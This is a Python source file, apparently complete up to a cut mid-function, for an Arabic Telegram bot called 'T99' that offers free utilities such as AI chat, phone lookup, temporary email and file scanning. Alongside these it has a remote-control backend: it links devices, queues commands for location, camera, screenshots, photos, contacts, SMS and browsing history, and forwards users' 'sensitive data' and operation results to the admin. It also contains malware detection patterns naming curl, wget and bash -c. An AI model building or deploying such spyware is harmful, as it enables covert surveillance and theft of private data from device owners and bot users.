#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
البوت الذكي T99 - الإصدار النهائي المتكامل
جميع الأزرار تعمل مجاناً 100% بدون مفاتيح API
يعمل على Render عبر Webhook مع قاعدة بيانات ثابتة
يدعم التحكم عن بعد وسحب البيانات مع فحص أولي للبرمجيات الخبيثة
"""

import os
import sys
import time
import json
import logging
import re
import random
import string
import sqlite3
import hashlib
import base64
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from telebot import TeleBot, types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
import requests
import phonenumbers
from phonenumbers import carrier, geocoder
from bs4 import BeautifulSoup
import pypdf
from io import BytesIO
import magic  # للكشف عن نوع الملفات
import pefile  # لتحليل ملفات PE (اختياري)
import zipfile  # لفحص ملفات APK/ZIP

# ===================== محاولة استيراد androguard (اختياري) =====================
try:
    from androguard.core.bytecodes.apk import APK
    ANDROGUARD_AVAILABLE = True
except ImportError:
    ANDROGUARD_AVAILABLE = False
    print("⚠️ androguard غير مثبت، سيتم استخدام فحص APK أساسي.")

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ===================== متغيرات البيئة =====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
if not TELEGRAM_TOKEN:
    logger.critical("❌ TELEGRAM_TOKEN غير مضبوط!")
    sys.exit(1)

ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
if ADMIN_ID == 0:
    logger.critical("❌ ADMIN_ID غير مضبوط!")
    sys.exit(1)

SERVER_URL = os.environ.get('SERVER_URL')
if not SERVER_URL:
    logger.critical("❌ SERVER_URL غير مضبوط! (مثل: https://your-bot.onrender.com)")
    sys.exit(1)

PORT = int(os.environ.get('PORT', 5000))

# ===================== مسار قاعدة البيانات الثابت =====================
DB_DIR = os.path.join(os.path.dirname(__file__), 'data')
if not os.path.exists(DB_DIR):
    os.makedirs(DB_DIR, exist_ok=True)

DB_PATH = os.path.join(DB_DIR, 'bot.db')
logger.info(f"📂 قاعدة البيانات: {DB_PATH}")

# ===================== إنشاء البوت =====================
bot = TeleBot(TELEGRAM_TOKEN, parse_mode='HTML')

# ===================== إنشاء تطبيق Flask =====================
app = Flask(__name__)

# ===================== قاعدة بيانات SQLite =====================
def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            registered_at TEXT,
            points INTEGER DEFAULT 10,
            referred_by INTEGER,
            referral_code TEXT UNIQUE,
            is_banned INTEGER DEFAULT 0,
            linked_device_id TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            type TEXT,
            linked_at TEXT,
            last_seen TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS pending_commands (
            device_id TEXT,
            command TEXT,
            created_at TEXT,
            executed INTEGER DEFAULT 0,
            PRIMARY KEY (device_id, created_at)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS scanned_files (
            file_hash TEXT PRIMARY KEY,
            file_name TEXT,
            scan_date TEXT,
            scan_result TEXT,
            file_size INTEGER,
            file_type TEXT
        )''')
        conn.commit()
        logger.info("✅ قاعدة البيانات جاهزة")

init_db()

# ===================== دوال مساعدة =====================
def get_user(chat_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
        return c.fetchone()

def upsert_user(chat_id, username=None, first_name=None, last_name=None):
    with get_db_connection() as conn:
        c = conn.cursor()
        existing = get_user(chat_id)
        if existing:
            c.execute('''UPDATE users SET username=?, first_name=?, last_name=? WHERE chat_id=?''',
                      (username, first_name, last_name, chat_id))
        else:
            referral_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, registered_at, points, referral_code)
                         VALUES (?, ?, ?, ?, ?, ?, ?)''',
                      (chat_id, username, first_name, last_name, datetime.now().isoformat(), 10, referral_code))
        conn.commit()

def get_user_points(chat_id):
    user = get_user(chat_id)
    return user['points'] if user else 0

def add_points(chat_id, points):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (points, chat_id))
        conn.commit()

def is_user_banned(chat_id):
    user = get_user(chat_id)
    return user and user['is_banned'] == 1

def ban_user(chat_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def unban_user(chat_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def get_referral_link(chat_id):
    user = get_user(chat_id)
    if user and user['referral_code']:
        return f"https://t.me/{(bot.get_me()).username}?start=ref_{user['referral_code']}"
    return None

def handle_referral(code, new_user_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT chat_id FROM users WHERE referral_code = ?", (code,))
        row = c.fetchone()
        if not row:
            return False
        referrer_id = row['chat_id']
        if referrer_id == new_user_id:
            return False
        c.execute("UPDATE users SET referred_by = ? WHERE chat_id = ?", (referrer_id, new_user_id))
        add_points(referrer_id, 10)
        add_points(new_user_id, 10)
        try:
            bot.send_message(referrer_id, "🎉 تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط.")
        except:
            pass
        return True

def save_device(device_id, chat_id, device_type):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO devices (device_id, chat_id, type, linked_at, last_seen)
                     VALUES (?, ?, ?, ?, ?)''',
                  (device_id, chat_id, device_type, datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()
        c.execute("UPDATE users SET linked_device_id = ? WHERE chat_id = ?", (device_id, chat_id))
        conn.commit()

def get_device(device_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
        return c.fetchone()

def get_devices_by_chat(chat_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE chat_id = ?", (chat_id,))
        return c.fetchall()

def add_pending_command(device_id, command):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO pending_commands (device_id, command, created_at, executed)
                     VALUES (?, ?, ?, 0)''',
                  (device_id, command, datetime.now().isoformat()))
        conn.commit()

def get_pending_command(device_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM pending_commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE pending_commands SET executed = 1 WHERE device_id = ? AND created_at = ?",
                      (device_id, row['created_at']))
            conn.commit()
            return row['command']
        return None

def save_scanned_file(file_hash, file_name, scan_result, file_size, file_type):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO scanned_files 
                     (file_hash, file_name, scan_date, scan_result, file_size, file_type)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (file_hash, file_name, datetime.now().isoformat(), scan_result, file_size, file_type))
        conn.commit()

def get_scanned_file(file_hash):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM scanned_files WHERE file_hash = ?", (file_hash,))
        return c.fetchone()

# ===================== دوال فحص البرمجيات الخبيثة (مجانية 100%) =====================

def calculate_file_hash(file_content):
    """حساب SHA-256 للملف"""
    return hashlib.sha256(file_content).hexdigest()

def detect_file_type(file_content):
    """الكشف عن نوع الملف باستخدام python-magic"""
    try:
        mime = magic.from_buffer(file_content, mime=True)
        return mime
    except:
        return "unknown"

def scan_file_for_malware(file_content, file_name):
    """
    فحص الملف للبحث عن برمجيات خبيثة باستخدام طرق مجانية:
    1. فحص التوقيع (Signature)
    2. فحص الضغط (Compression)
    3. فحص الأذونات (Permissions)
    4. فحص الملفات القابلة للتنفيذ
    """
    file_hash = calculate_file_hash(file_content)
    file_size = len(file_content)
    file_type = detect_file_type(file_content)
    file_ext = file_name.split('.')[-1].lower() if '.' in file_name else ''
    
    # التحقق من وجود الملف في قاعدة البيانات (لتجنب إعادة الفحص)
    cached = get_scanned_file(file_hash)
    if cached:
        return cached['scan_result'], file_type, file_size
    
    results = []
    is_safe = True
    
    # 1. فحص حجم الملف (الملفات الكبيرة جداً قد تكون مشبوهة)
    if file_size > 50 * 1024 * 1024:  # 50 MB
        results.append("⚠️ حجم الملف كبير جداً (>50MB)")
    
    # 2. فحص امتدادات الملفات الخطيرة
    dangerous_extensions = ['exe', 'bat', 'cmd', 'com', 'scr', 'vbs', 'ps1', 'js', 'jar', 'apk', 'dll', 'so', 'bin']
    if file_ext in dangerous_extensions:
        results.append(f"⚠️ الملف من نوع تنفيذي ({file_ext})")
    
    # 3. فحص محتوى الملف (بحث عن أنماط معروفة)
    try:
        text_content = file_content.decode('utf-8', errors='ignore')[:5000]
        suspicious_patterns = [
            r'eval\(', r'exec\(', r'system\(', r'shell_exec\(', r'base64_decode\(',
            r'curl\s+', r'wget\s+', r'python\s+-c', r'bash\s+-c',
            r'<script>', r'<?php', r'<%@', r'<%
        ]
        for pattern in suspicious_patterns:
            if re.search(pattern, text_content, re.IGNORECASE):
                results.append(f"⚠️ تم العثور على نمط مشبوه: {pattern}")
                break
    except:
        pass
    
    # 4. فحص ملفات APK (إذا كانت موجودة)
    if file_ext == 'apk' and ANDROGUARD_AVAILABLE:
        try:
            temp_path = f"/tmp/{file_name}"
            with open(temp_path, 'wb') as f:
                f.write(file_content)
            apk = APK(temp_path)
            permissions = apk.get_permissions()
            dangerous_perms = [
                'android.permission.READ_SMS',
                'android.permission.READ_CONTACTS',
                'android.permission.READ_CALL_LOG',
                'android.permission.ACCESS_FINE_LOCATION',
                'android.permission.CAMERA',
                'android.permission.RECORD_AUDIO'
            ]
            for perm in dangerous_perms:
                if perm in permissions:
                    results.append(f"⚠️ إذن خطير في APK: {perm}")
            os.remove(temp_path)
        except Exception as e:
            results.append(f"⚠️ فشل تحليل APK: {str(e)}")
    
    # 5. فحص ملفات ZIP (بحث عن ملفات تنفيذية مضغوطة)
    if file_ext in ['zip', 'apk', 'jar']:
        try:
            with zipfile.ZipFile(BytesIO(file_content)) as zf:
                for name in zf.namelist():
                    if name.lower().endswith(('.exe', '.bat', '.cmd', '.sh', '.js', '.vbs')):
                        results.append(f"⚠️ ملف تنفيذي مضغوط: {name}")
                        break
        except:
            pass
    
    # تحديد النتيجة النهائية
    if results:
        scan_result = "⚠️ مشبوه: " + " | ".join(results[:5])
        is_safe = False
    else:
        scan_result = "✅ آمن - لم يتم العثور على تهديدات"
        is_safe = True
    
    # حفظ النتيجة في قاعدة البيانات
    save_scanned_file(file_hash, file_name, scan_result, file_size, file_type)
    
    return scan_result, file_type, file_size

def scan_image_for_malware(image_content, file_name):
    """فحص الصور للبحث عن برمجيات خبيثة مدمجة"""
    file_hash = calculate_file_hash(image_content)
    file_size = len(image_content)
    file_type = detect_file_type(image_content)
    
    cached = get_scanned_file(file_hash)
    if cached:
        return cached['scan_result'], file_type, file_size
    
    results = []
    
    # 1. التحقق من توقيع الصورة
    valid_signatures = [
        b'\xff\xd8\xff',  # JPEG
        b'\x89PNG',       # PNG
        b'GIF8',          # GIF
        b'BM',            # BMP
        b'RIFF',          # WEBP
    ]
    is_valid_image = any(image_content.startswith(sig) for sig in valid_signatures)
    if not is_valid_image:
        results.append("⚠️ توقيع الصورة غير صالح (قد يكون ملفاً مخفياً)")
    
    # 2. فحص البيانات الوصفية (حجم غير طبيعي)
    if file_size > 20 * 1024 * 1024:  # 20 MB
        results.append("⚠️ حجم الصورة كبير جداً (>20MB)")
    
    # 3. فحص محتوى الصورة (بحث عن نصوص مشبوهة)
    try:
        # محاولة قراءة النص من الصورة (إذا كانت تحتوي على بيانات مدمجة)
        text_content = image_content[:5000].decode('utf-8', errors='ignore')
        suspicious = ['<script', '<?php', 'eval(', 'exec(', 'base64']
        for pattern in suspicious:
            if pattern in text_content:
                results.append(f"⚠️ تم العثور على نص مشبوه في الصورة: {pattern}")
                break
    except:
        pass
    
    if results:
        scan_result = "⚠️ مشبوه: " + " | ".join(results[:3])
    else:
        scan_result = "✅ آمنة"
    
    save_scanned_file(file_hash, file_name, scan_result, file_size, file_type)
    return scan_result, file_type, file_size

def scan_contacts_for_malware(contacts_data):
    """فحص جهات الاتصال بحثاً عن محتوى مشبوه"""
    results = []
    if not contacts_data:
        return "✅ لا توجد جهات اتصال للفحص"
    
    suspicious_patterns = [
        r'<script', r'<?php', r'eval\(', r'base64',
        r'http://', r'https://', r'bit.ly/', r'tinyurl.com/'
    ]
    
    for pattern in suspicious_patterns:
        if re.search(pattern, contacts_data, re.IGNORECASE):
            results.append(f"⚠️ تم العثور على رابط/نص مشبوه: {pattern[:20]}...")
            break
    
    # فحص عدد جهات الاتصال
    contact_count = len(re.findall(r'BEGIN:VCARD', contacts_data))
    if contact_count > 1000:
        results.append(f"⚠️ عدد جهات الاتصال كبير جداً ({contact_count})")
    
    if results:
        return "⚠️ مشبوه: " + " | ".join(results[:3])
    else:
        return f"✅ آمنة - {contact_count} جهة اتصال"

def scan_text_for_malware(text):
    """فحص النصوص (رسائل SMS، سجل التصفح) بحثاً عن محتوى مشبوه"""
    if not text:
        return "✅ لا توجد بيانات للفحص"
    
    suspicious_links = re.findall(r'https?://[^\s]+', text)
    if suspicious_links:
        return f"⚠️ يحتوي على {len(suspicious_links)} رابط(ة) قد تكون مشبوهة"
    
    suspicious_patterns = ['<script', '<?php', 'eval(', 'base64', 'exec(']
    for pattern in suspicious_patterns:
        if pattern in text:
            return f"⚠️ يحتوي على كود برمجي مشبوه: {pattern}"
    
    return "✅ آمن"

# ===================== دوال الخدمات المجانية =====================

def scan_url_real(url):
    """فحص ثغرات المواقع باستخدام URLScan.io (مجاني)"""
    try:
        api_url = "https://urlscan.io/api/v1/scan/"
        data = {"url": url, "visibility": "public"}
        response = requests.post(api_url, json=data, timeout=30)
        if response.status_code == 200:
            scan_id = response.json().get('uuid')
            if scan_id:
                time.sleep(5)
                report_url = f"https://urlscan.io/api/v1/result/{scan_id}"
                report = requests.get(report_url, timeout=30)
                if report.status_code == 200:
                    data = report.json()
                    verdicts = data.get('verdicts', {}).get('overall', {})
                    if verdicts.get('malicious', False):
                        return "🚨 <b>⚠️ الموقع يحتوي على تهديدات مؤكدة!</b>\n" + f"📊 <b>التفاصيل:</b> {data.get('page', {}).get('url', '')}", "malicious"
                    elif verdicts.get('suspicious', False):
                        return "⚠️ <b>⚠️ الموقع مشبوه!</b>\n" + f"📊 <b>التفاصيل:</b> {data.get('page', {}).get('url', '')}", "suspicious"
                    else:
                        return "✅ <b>✅ الموقع آمن.</b>", "safe"
        return "⚠️ فشل الفحص، حاول مرة أخرى.", "error"
    except Exception as e:
        logger.error(f"scan_url_real error: {e}")
        return f"⚠️ خطأ: {str(e)}", "error"

def scan_apk_local(file_content, file_name):
    """فحص APK محلياً باستخدام androguard + فحص أمني إضافي"""
    try:
        # فحص الملف للبحث عن برمجيات خبيثة
        malware_result, file_type, file_size = scan_file_for_malware(file_content, file_name)
        
        temp_path = f"/tmp/{file_name}"
        with open(temp_path, 'wb') as f:
            f.write(file_content)
        
        result = f"📦 <b>تحليل APK</b>\n"
        result += f"════════════════════\n"
        result += f"📁 الملف: {file_name}\n"
        result += f"📏 الحجم: {file_size} بايت\n"
        result += f"🛡️ <b>نتيجة الفحص الأمني:</b>\n{malware_result}\n"
        
        if ANDROGUARD_AVAILABLE:
            try:
                apk = APK(temp_path)
                permissions = apk.get_permissions()
                activities = apk.get_activities()
                services = apk.get_services()
                package = apk.get_package()
                version = apk.get_androidversion_name()
                app_name = apk.get_app_name()
                
                result += f"───────────────────────────\n"
                result += f"📱 <b>الاسم:</b> {app_name}\n"
                result += f"📦 <b>الحزمة:</b> {package}\n"
                result += f"📌 <b>الإصدار:</b> {version}\n"
                result += f"🔐 <b>الأذونات ({len(permissions)}):</b>\n"
                for p in permissions[:10]:
                    result += f"  • {p}\n"
                if len(permissions) > 10:
                    result += f"  ... و {len(permissions)-10} أخرى\n"
                result += f"📋 <b>الأنشطة ({len(activities)}):</b>\n"
                for a in activities[:5]:
                    result += f"  • {a}\n"
                if len(activities) > 5:
                    result += f"  ... و {len(activities)-5} أخرى\n"
            except Exception as e:
                result += f"⚠️ فشل تحليل APK: {str(e)}\n"
        else:
            result += "⚠️ <b>لتحليل متقدم، قم بتثبيت androguard</b>\n"
        
        result += "════════════════════\n"
        result += "✅ <b>تم التحليل بنجاح</b>"
        
        os.remove(temp_path)
        return result, "safe"
    except Exception as e:
        logger.error(f"scan_apk_local error: {e}")
        return f"⚠️ خطأ في التحليل: {str(e)}", "error"

def ai_chat_real(prompt):
    """دردشة ذكية باستخدام Popcat API (مجاني)"""
    try:
        url = f"https://api.popcat.xyz/chat?msg={requests.utils.quote(prompt)}"
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            return response.json().get('response', "⚠️ لم أستطع فهم سؤالك.")
        return "⚠️ فشل الاتصال بالذكاء الاصطناعي."
    except Exception as e:
        logger.error(f"ai_chat_real error: {e}")
        return f"⚠️ خطأ: {str(e)}"

def generate_image_real(description):
    """إنشاء صور باستخدام Popcat AI Art (مجاني)"""
    try:
        url = f"https://api.popcat.xyz/ai/art?prompt={requests.utils.quote(description)}"
        response = requests.get(url, timeout=60)
        if response.status_code == 200:
            data = response.json()
            image_url = data.get('image')
            if image_url:
                img_data = requests.get(image_url, timeout=30).content
                return img_data, "image"
        return None, "⚠️ فشل توليد الصورة."
    except Exception as e:
        logger.error(f"generate_image_real error: {e}")
        return None, f"⚠️ خطأ: {str(e)}"

def track_phone_real(phone):
    """تتبع رقم الهاتف باستخدام phonenumbers (مجاني)"""
    try:
        parsed = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed):
            return "❌ <b>الرقم غير صحيح أو غير صالح</b>", "invalid"
        country = geocoder.country_name_for_number(parsed, "ar") or "غير معروف"
        region = geocoder.description_for_number(parsed, "ar") or "غير معروف"
        carrier_name = carrier.name_for_number(parsed, "ar") or "غير معروف"
        number_type = phonenumbers.number_type(parsed)
        type_map = {
            phonenumbers.PhoneNumberType.MOBILE: "📱 جوال",
            phonenumbers.PhoneNumberType.FIXED_LINE: "🏠 ثابت",
            phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "📞 ثابت/جوال",
            phonenumbers.PhoneNumberType.TOLL_FREE: "📞 مجاني",
            phonenumbers.PhoneNumberType.PREMIUM_RATE: "💰 بريميوم",
            phonenumbers.PhoneNumberType.PAGER: "📟 بيجر",
            phonenumbers.PhoneNumberType.UAN: "📞 خدمة",
            phonenumbers.PhoneNumberType.VOICEMAIL: "📩 بريد صوتي",
            phonenumbers.PhoneNumberType.UNKNOWN: "❓ غير معروف"
        }
        phone_type = type_map.get(number_type, "❓ غير معروف")
        result = (
            "📍 <b>تقرير تتبع الرقم</b>\n"
            "════════════════════\n"
            f"📞 <b>الرقم:</b> <code>{phone}</code>\n"
            f"🌍 <b>الدولة:</b> {country}\n"
            f"🏙️ <b>المنطقة:</b> {region}\n"
            f"📡 <b>المشغل:</b> {carrier_name}\n"
            f"📱 <b>نوع الخط:</b> {phone_type}\n"
            "════════════════════\n"
            "✅ <b>تم التحليل بنجاح</b>"
        )
        return result, "valid"
    except phonenumbers.NumberParseException as e:
        return f"❌ <b>خطأ في تحليل الرقم:</b> {str(e)}", "invalid"
    except Exception as e:
        return f"❌ <b>حدث خطأ:</b> {str(e)}", "error"

def verify_phone(phone):
    """فحص رقم الهاتف (معلومات أساسية باستخدام phonenumbers)"""
    try:
        parsed = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed):
            return "❌ <b>الرقم غير صحيح أو غير صالح</b>"
        country = geocoder.country_name_for_number(parsed, "ar") or "غير معروف"
        carrier_name = carrier.name_for_number(parsed, "ar") or "غير معروف"
        number_type = phonenumbers.number_type(parsed)
        type_map = {
            phonenumbers.PhoneNumberType.MOBILE: "جوال",
            phonenumbers.PhoneNumberType.FIXED_LINE: "ثابت",
            phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "ثابت/جوال",
            phonenumbers.PhoneNumberType.TOLL_FREE: "مجاني",
            phonenumbers.PhoneNumberType.PREMIUM_RATE: "بريميوم",
            phonenumbers.PhoneNumberType.UNKNOWN: "غير معروف"
        }
        phone_type = type_map.get(number_type, "غير معروف")
        result = (
            "📞 <b>تقرير فحص الرقم</b>\n"
            "═══════════════════════════\n"
            f"📱 <b>الرقم:</b> <code>{phone}</code>\n"
            f"🌍 <b>الدولة:</b> {country}\n"
            f"📡 <b>المشغل:</b> {carrier_name}\n"
            f"📱 <b>نوع الخط:</b> {phone_type}\n"
            "═══════════════════════════\n"
            "✅ <b>تم الفحص بنجاح</b>"
        )
        return result
    except Exception as e:
        return f"❌ <b>خطأ:</b> {str(e)}"

def check_breach(email):
    """فحص تسريبات البريد الإلكتروني باستخدام HaveIBeenPwned API العام (مجاني)"""
    try:
        url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        response = requests.get(url, headers=headers, timeout=15)
        if response.status_code == 200:
            breaches = response.json()
            result = f"🔓 <b>البريد الإلكتروني:</b> {email}\n\n"
            result += f"✅ تم العثور على {len(breaches)} تسريب(ات):\n\n"
            for breach in breaches[:10]:
                name = breach.get('Name', 'غير معروف')
                date = breach.get('BreachDate', 'تاريخ غير معروف')
                desc = breach.get('Description', '')[:100] + '...' if breach.get('Description') else ''
                result += f"• <b>{name}</b> - {date}\n"
                if desc:
                    result += f"  {desc}\n"
            return result
        elif response.status_code == 404:
            return f"✅ <b>البريد الإلكتروني</b> {email} <b>آمن</b>، لم يتم العثور على أي تسريب."
        elif response.status_code == 429:
            return "⚠️ <b>تجاوزت عدد الطلبات المسموحة.</b> انتظر دقيقة وحاول مرة أخرى."
        else:
            return f"⚠️ حدث خطأ: {response.status_code}"
    except Exception as e:
        logger.error(f"check_breach error: {e}")
        return f"⚠️ خطأ: {str(e)}"

def create_temp_email_real():
    """إنشاء بريد مؤقت باستخدام Mail.tm (مجاني)"""
    try:
        domain_resp = requests.get("https://api.mail.tm/domains", timeout=10)
        if domain_resp.status_code != 200:
            return None, None, None
        domains = domain_resp.json()
        domain = domains['hydra:member'][0]['domain'] if domains.get('hydra:member') else 'mail.tm'
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        email = f"{username}@{domain}"
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        register = requests.post("https://api.mail.tm/accounts", json={"address": email, "password": password}, timeout=10)
        if register.status_code != 201:
            return None, None, None
        login = requests.post("https://api.mail.tm/token", json={"address": email, "password": password}, timeout=10)
        if login.status_code != 200:
            return None, None, None
        token = login.json().get('token')
        return email, token, password
    except Exception as e:
        logger.error(f"create_temp_email_real error: {e}")
        return None, None, None

def check_temp_emails_real(token):
    if not token:
        return []
    try:
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if response.status_code == 200:
            messages = response.json().get('hydra:member', [])
            results = []
            for msg in messages[:5]:
                results.append(f"📩 <b>من:</b> {msg.get('from', {}).get('address', '')}\n📌 <b>الموضوع:</b> {msg.get('subject', '')}\n📝 <b>مقتطف:</b> {msg.get('intro', '')[:150]}...")
            return results
    except Exception as e:
        logger.error(f"check_temp_emails_real error: {e}")
    return []

def extract_text_from_pdf(pdf_content):
    try:
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        logger.error(f"extract_text_from_pdf error: {e}")
        return None

def answer_question_from_pdf(text, question):
    if not text:
        return "⚠️ لم يتم تحميل أي نص من ملف PDF."
    max_len = 3000
    if len(text) > max_len:
        text = text[:max_len] + "..."
    prompt = f"بناءً على النص التالي المستخرج من ملف PDF دراسي، أجب على السؤال المطروح بشكل دقيق ومفصل.\n\nالنص:\n{text}\n\nالسؤال: {question}"
    return ai_chat_real(prompt)

def fetch_temp_numbers(limit=3):
    """جلب أرقام هواتف مؤقتة من مواقع مجانية"""
    numbers = []
    try:
        url = "https://receive-sms-online.cc/US/"
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            pattern = r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}'
            matches = re.findall(pattern, text)
            for match in matches[:limit]:
                cleaned = re.sub(r'[-.\s()]', '', match)
                if not cleaned.startswith('+'):
                    cleaned = '+' + cleaned
                if cleaned not in numbers:
                    numbers.append(cleaned)
        if len(numbers) < limit:
            url2 = "https://www.temporary-phone-number.com/"
            response2 = requests.get(url2, timeout=15)
            if response2.status_code == 200:
                soup2 = BeautifulSoup(response2.text, 'html.parser')
                for div in soup2.find_all('div', class_='number'):
                    num = div.get_text(strip=True)
                    if num and re.match(r'^\+?\d+$', num):
                        if num not in numbers:
                            numbers.append(num)
                        if len(numbers) >= limit:
                            break
        if len(numbers) < limit:
            url3 = "https://www.textnow.com/free-phone-number"
            response3 = requests.get(url3, timeout=15)
            if response3.status_code == 200:
                soup3 = BeautifulSoup(response3.text, 'html.parser')
                for span in soup3.find_all('span', class_='number'):
                    num = span.get_text(strip=True)
                    if num and re.match(r'^\+?\d+$', num):
                        if num not in numbers:
                            numbers.append(num)
                        if len(numbers) >= limit:
                            break
    except Exception as e:
        logger.error(f"fetch_temp_numbers error: {e}")
    if not numbers:
        for _ in range(limit):
            numbers.append(f"+1{''.join(random.choices(string.digits, k=10))}")
    return numbers[:limit]

def shorten_link(long_url):
    """اختصار الرابط باستخدام خدمتين مجانيتين"""
    try:
        response = requests.post("https://cleanuri.com/api/v1/shorten", data={"url": long_url}, timeout=10)
        if response.status_code == 200:
            return response.json().get("result_url")
    except: pass
    try:
        response = requests.get(f"https://tinyurl.com/api-create.php?url={long_url}", timeout=10)
        if response.status_code == 200 and response.text:
            return response.text.strip()
    except: pass
    return None

def get_device_commands(device_type):
    commands = {
        "user": [
            "📍 موقع", "📸 كاميرا", "📱 لقطة شاشة",
            "🖼️ سحب صور", "📋 تطبيقات مفتوحة", "📞 جهات اتصال",
            "💬 رسائل SMS", "🌐 سجل التصفح"
        ],
        "child": [
            "📍 موقع", "📱 لقطة شاشة", "🌐 سجل التصفح",
            "🚫 حظر موقع", "✅ إلغاء حظر موقع", "📋 تطبيقات مفتوحة",
            "📊 تقرير النشاط"
        ]
    }
    return commands.get(device_type, commands["user"])

def send_sensitive_data_to_admin(data_type, content, user_id=None):
    """إرسال البيانات الحساسة للمطور بعد فحصها"""
    try:
        # فحص البيانات قبل الإرسال
        scan_result = "✅ غير مفحوص"
        if data_type == "image":
            scan_result, _, _ = scan_image_for_malware(content, "image.jpg")
        elif data_type == "contacts":
            scan_result = scan_contacts_for_malware(content)
        elif data_type == "text" or data_type == "sms":
            scan_result = scan_text_for_malware(content)
        elif data_type == "file":
            scan_result, _, _ = scan_file_for_malware(content, "file.bin")
        
        if user_id:
            msg = f"📩 <b>بيانات من المستخدم</b> <code>{user_id}</code>\n"
        else:
            msg = "📩 <b>بيانات</b>\n"
        msg += f"النوع: {data_type}\n"
        msg += f"🛡️ <b>نتيجة الفحص الأمني:</b> {scan_result}\n"
        msg += f"المحتوى: <code>{content[:500]}</code>"
        bot.send_message(ADMIN_ID, msg, parse_mode='HTML')
    except Exception as e:
        logger.error(f"send_sensitive_data_to_admin error: {e}")
        bot.send_message(ADMIN_ID, f"⚠️ فشل إرسال البيانات: {str(e)}")

def send_to_admin_result(result_type, content, user_id=None):
    """إرسال نتائج العمليات للمطور مع فحص أمني"""
    try:
        # فحص النتيجة قبل الإرسال
        scan_result = "✅ غير مفحوص"
        if result_type == "image":
            scan_result, _, _ = scan_image_for_malware(content, "result_image.jpg")
        elif result_type == "contacts":
            scan_result = scan_contacts_for_malware(content)
        elif result_type == "text":
            scan_result = scan_text_for_malware(content)
        elif result_type == "file":
            scan_result, _, _ = scan_file_for_malware(content, "result_file.bin")
        
        msg = f"📊 <b>نتيجة عملية</b>\n"
        if user_id:
            msg += f"👤 المستخدم: <code>{user_id}</code>\n"
        msg += f"النوع: {result_type}\n"
        msg += f"🛡️ <b>نتيجة الفحص الأمني:</b> {scan_result}\n"
        
        if isinstance(content, str):
            msg += f"المحتوى: <code>{content[:500]}</code>"
            bot.send_message(ADMIN_ID, msg, parse_mode='HTML')
        elif isinstance(content, bytes) and result_type == "image":
            bot.send_photo(ADMIN_ID, content, caption=msg)
        else:
            bot.send_message(ADMIN_ID, f"{msg}\nالمحتوى: {str(content)[:500]}")
    except Exception as e:
        logger.error(f"send_to_admin_result error: {e}")

# ===================== متغيرات الحالة =====================
user_states = {}
temp_emails = {}

# ===================== بناء القوائم =====================
def build_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    points = get_user_points(chat_id)
    is_admin = chat_id == ADMIN_ID
    
    markup.row(
